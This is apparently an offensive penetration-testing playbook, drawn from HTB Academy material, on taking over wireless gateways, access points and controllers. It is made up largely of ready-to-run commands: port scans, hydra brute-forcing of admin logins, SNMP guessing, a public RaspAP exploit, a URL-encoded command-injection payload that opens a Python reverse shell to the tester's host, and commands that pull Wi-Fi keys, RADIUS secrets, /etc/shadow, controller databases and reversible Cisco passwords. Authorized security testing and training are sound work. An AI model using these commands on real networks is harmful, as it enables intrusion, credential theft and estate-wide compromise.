# Wireless - Gateway, AP and controller exploitation

## Fingerprinting the gateway once you are on the network

**Trigger:** You have an address on a wireless segment and the routing table names a gateway.

The gateway is the first internal host you can reach and on a small site it is frequently the access point itself, which makes it disproportionately valuable: it holds the PSKs for every SSID it serves, the RADIUS shared secret if the network is enterprise, the VLAN configuration that defines the segmentation you are trying to test, and often credentials reused elsewhere. Start by identifying what it is. A service scan with script output usually names the product outright — the HTTP server header, the basic-auth realm, the page title and the certificate subject are all identifying — and a named product plus a version is a CVE search. Do not skip the full port scan: management interfaces routinely sit on high ports that a top-1000 scan misses, and SSH, Telnet, SNMP and TFTP on a gateway are all more interesting than the web interface. The realm string in a 401 response is a particularly reliable identifier because vendors rarely change it.

```bash
ip route ; route -n                       # gateway address

nmap -sV -sC -p- --open <gateway>
nmap -sV -sC -p 22,23,80,443,8080,8443,8291,161 <gateway>
nmap -sU -p 161,69 <gateway>              # SNMP and TFTP

curl -sI http://<gateway>/
curl -s http://<gateway>/ | grep -iE "<title>|generator|vendor"
whatweb http://<gateway>/
openssl s_client -connect <gateway>:443 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer

# Typical identifications:
#   Basic realm=RaspAP, lighttpd            RaspAP
#   "UniFi", port 8443                      Ubiquiti controller
#   "ArubaOS", "Instant"                    Aruba
#   port 8291                               MikroTik Winbox
#   "Cisco", port 443 + 16113               Cisco WLC
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation

## Default and brute-forced credentials on the management interface

**Trigger:** The gateway or controller presents a login and you have no credentials for it.

Try defaults first, because on wireless infrastructure they work far more often than on servers — access points are frequently deployed by whoever was on site rather than by the team that manages the servers, and vendor defaults survive. Use the OUI-derived vendor to pick the right default list rather than spraying a generic one. If defaults fail, brute force is viable against most of these devices because they rarely implement lockout, but the mechanics differ by authentication type and getting this wrong is the usual reason a hydra run produces nothing. HTTP Basic authentication needs the `http-get` or `http-head` module and, if you are supplying a password-only wordlist, a combination file with the username prepended — hydra's `-C` option expects `user:pass` per line and will silently do the wrong thing otherwise. Form-based logins need the `http-post-form` module with the field names and a failure string taken from an actual failed attempt, so capture one in the browser first. Confirm which you are facing by reading the response to an unauthenticated request: a `WWW-Authenticate: Basic realm=` header is basic auth, an HTML form is not.

```bash
curl -sI http://<gateway>/                # WWW-Authenticate header -> Basic auth?

# HTTP Basic — hydra -C wants user:pass pairs
sed -e 's/^/admin:/' /opt/wordlist.txt > combos.txt
hydra -C combos.txt <gateway> -s 80 http-get /
hydra -C combos.txt <gateway> -s 80 http-head /

# Form-based — take the field names and failure string from a real failed attempt
hydra -l admin -P /opt/wordlist.txt <gateway> \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Other management services
hydra -l admin -P /opt/wordlist.txt ssh://<gateway>
hydra -l admin -P /opt/wordlist.txt telnet://<gateway>
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <gateway>     # SNMP communities

# Credentials already recovered on this engagement are the highest-yield candidates
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation

## From admin access to code execution

**Trigger:** You hold administrative credentials on an AP, gateway or controller web interface.

Wireless infrastructure firmware is a large body of old code with a consistent weakness: the web interface exposes operational functions — ping, traceroute, network configuration, diagnostics, firmware operations — that pass user input into a shell, and the parameter validation on those endpoints is routinely inadequate. Find the version from the About or System page, search for a public exploit, and try it; but when a published exploit fails, do not conclude the vulnerability is absent, because these scripts are frequently written against one firmware build and break on the next over a changed endpoint path or parameter name. Manual exploitation of the same underlying flaw usually works: capture the request the interface makes, find the parameter that reaches a command, and append your own with a shell metacharacter. A Python reverse shell is the most portable payload since these devices usually have Python but rarely have netcat with `-e`. Remember the listener must be on your wireless interface's address, not on some other interface of your attack host — getting that wrong produces a shell that connects nowhere and is the most common self-inflicted failure here.

```bash
# 1. Version, then a public exploit
searchsploit raspap
searchsploit -m 50224

ip addr show wlan0                        # the address the target can actually reach
nc -nvlp 1337

python3 50224.py <gateway> 80 admin '<password>' <your-wlan-ip> 1337

# 2. When the script fails, do it by hand: capture the request in Burp,
#    append a payload to the parameter that reaches a shell.
#    Example against a wpa_conf-style endpoint:
&&connect=wlan;%20python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect(("<your-wlan-ip>",1337))%3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn("/bin/bash")'

# 3. Stabilise
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation

## Extracting keys, secrets and configuration from a compromised AP

**Trigger:** You have a shell on an access point, gateway or controller.

This is where the compromise pays off, because the device stores in plaintext or trivially recoverable form exactly the material the rest of the engagement needs. The `hostapd` and `wpa_supplicant` configurations hold the PSKs for every SSID the device serves, which frequently includes networks you could not crack. If the site is enterprise, the RADIUS client configuration holds the shared secret, which allows you to impersonate an authenticator to the real RADIUS server. The DHCP and DNS configuration reveals the internal addressing and the domain. The VLAN configuration on the interfaces and bridges tells you precisely how the segmentation you have been probing from the outside is actually implemented, which is far more reliable than inferring it from reachability tests. And on any device that has been administered for a while there will be backup configurations, saved credentials and connection histories. Take the whole configuration tree rather than grepping for one thing, because you will want to reference it later and you may not have this access twice.

```bash
# Wireless keys
cat /etc/hostapd/hostapd.conf /etc/hostapd*.conf 2>/dev/null | grep -iE "ssid|passphrase|wpa_psk"
cat /etc/wpa_supplicant/*.conf
cat /etc/config/wireless                  # OpenWrt
uci show wireless                         # OpenWrt

# RADIUS shared secret — lets you impersonate an authenticator
cat /etc/freeradius/*/clients.conf
cat /etc/raddb/clients.conf
grep -riE "radius|secret" /etc/ 2>/dev/null | grep -v Binary

# Network and segmentation
cat /etc/dnsmasq.conf /etc/dhcp/dhcpd.conf
ip -d link show                           # VLAN interfaces
bridge vlan show
cat /etc/network/interfaces

# Credentials and history
cat /etc/shadow /etc/passwd
find / -name "*.bak" -o -name "*config*" 2>/dev/null | head -50
cat ~/.ssh/known_hosts ~/.bash_history
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation; operator practice

## Controllers and centrally managed estates

**Trigger:** The site uses managed access points and you have reached the controller, or a controller is reachable from the wireless segment.

A controller is a much higher-value target than any single access point, because it holds the configuration for the entire estate — every SSID's PSK, every RADIUS secret, the VLAN mapping for each network, and the administrative accounts. Reaching one turns a single-site finding into an estate-wide one. The common products each have their own storage layout and their own history of authentication-bypass vulnerabilities, so identify the product precisely before searching. UniFi keeps its configuration in MongoDB on the controller host, which is readable directly if you have shell and is frequently exposed without authentication on the loopback interface. Aruba and Cisco keep configuration in device files that are retrievable via the CLI or TFTP, and both have historically shipped with retrievable running configurations over SNMP with a default community. TFTP is worth checking on any network device estate because configuration backups are commonly pushed to a TFTP server with no authentication at all, and a directory of router and AP configurations is a comprehensive credential harvest.

```bash
nmap -sV -p 22,443,8080,8443,8880,6789,161,69 <controller>

# UniFi — MongoDB on the controller host
mongo --port 27117 ace --eval 'db.setting.find().forEach(printjson)'
mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson)'
cat /usr/lib/unifi/data/backup/autobackup/*.unf     # full estate backup

# Aruba / Cisco WLC — configuration over SNMP or TFTP
snmpwalk -v2c -c public <controller> 1.3.6.1.4.1.14823    # Aruba enterprise OID
snmpwalk -v2c -c public <controller> 1.3.6.1.4.1.9        # Cisco

# TFTP: configuration backups, usually unauthenticated
tftp <tftp-server> -c get running-config
nmap -sU -p 69 --script tftp-enum <subnet>

# Cisco Type 7 passwords in a recovered configuration are reversible
python3 ciscot7.py -d -f recovered.config
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation, Lateral Movement; operator practice
